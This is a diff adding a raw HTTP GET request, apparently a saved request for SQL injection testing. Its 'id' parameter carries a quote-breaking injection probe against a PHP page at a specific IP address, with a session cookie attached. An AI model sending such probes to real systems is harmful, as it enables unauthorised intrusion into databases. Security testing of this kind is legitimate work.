@@ -1,0 +1,7 @@
+GET /home/service/cate/?id=1'"1000 HTTP/1.1
+Host: 42.193.148.68
+User-Agent: Mozilla/5.0
+referer: https://42.193.148.68/home/service/cate/
+Cookie: PHPSESSID=7242b825ce03326685e210e92c720d9f
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
